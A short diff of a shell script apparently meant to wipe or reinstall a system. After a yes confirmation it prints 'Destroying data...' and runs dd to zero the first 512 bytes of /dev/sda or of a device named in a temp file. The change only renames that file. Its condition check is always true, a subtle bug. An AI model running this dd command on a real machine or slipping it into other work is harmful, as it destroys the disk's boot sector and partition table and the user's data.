@@ -4,7 +4,7 @@ if [[ $res1 = y ]];then
 #exec code
 echo Destroying data...
 devins="/dev/sda"
-if [[ /tmp/devins ]]; then devins=`cat /tmp/devins`; else devins="/dev/sda";fi
+if [[ /tmp/devins.dat ]]; then devins=`cat /tmp/devins.dat`; else devins="/dev/sda";fi
 dd if=/dev/zero of=$devins bs=512 count=1 conv=notrunc
 
 echo Detecting boot type
